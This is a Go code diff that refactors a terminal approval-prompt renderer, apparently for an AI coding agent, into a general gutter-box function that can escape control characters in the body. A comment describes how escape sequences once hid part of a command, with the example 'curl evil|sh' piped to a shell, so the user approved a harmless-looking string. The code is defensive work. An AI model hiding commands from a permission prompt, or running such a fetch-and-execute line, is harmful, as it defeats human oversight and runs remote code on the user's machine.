@@ -59,6 +59,17 @@ func ToolResult(name, summary string, isError bool) string {
 }
 
 func PermissionPrompt(toolName, desc string) string {
+	return GutterBox("需要授权", toolName, desc, true)
+}
+
+// GutterBox is the left-gutter block the approval and confirmation prompts
+// use: a header line naming the action, the body one line per row, an empty
+// gutter row at the end. escapeBody shows the body's control characters as
+// text (what the model wrote: a command, a path) and clips an enormous body
+// from the middle; false keeps a body the caller rendered itself (Markdown
+// with its own styles), which the caller has already passed through
+// render.VisibleControls before rendering.
+func GutterBox(header, name, body string, escapeBody bool) string {
 	var sb strings.Builder
 	sb.WriteString("\r\x1b[K")
 	sb.WriteString("\a")
@@ -84,12 +95,17 @@ func PermissionPrompt(toolName, desc string) string {
 	// unterminated "ESC ]" hid the rest of the command, a complete OSC hid its
 	// body and ESC + ';' hid the separator: "echo hi ESC]0;x; curl evil|sh BEL
 	// done" was approved as "echo hi done" while bash ran every part of it.
-	tool := render.VisibleControls(toolName)
+	tool := render.VisibleControls(name)
 	gutter := "  " + Yellow + "┃" + Reset
-	fmt.Fprintf(&sb, "\n%s %s需要授权%s  %s%s%s\n", gutter, Bold, Reset, Cyan, tool, Reset)
-	d := strings.TrimRight(render.VisibleControls(desc), "\n")
+	fmt.Fprintf(&sb, "\n%s %s%s%s  %s%s%s\n", gutter, Bold, header, Reset, Cyan, tool, Reset)
+	d := strings.TrimRight(body, "\n")
+	if escapeBody {
+		d = strings.TrimRight(render.VisibleControls(body), "\n")
+	}
 	if strings.TrimSpace(d) != "" {
-		d = textutil.ClipMiddleBytes(d, maxPromptDescBytes)
+		if escapeBody {
+			d = textutil.ClipMiddleBytes(d, maxPromptDescBytes)
+		}
 		for _, line := range strings.Split(d, "\n") {
 			fmt.Fprintf(&sb, "%s %s\n", gutter, line)
 		}
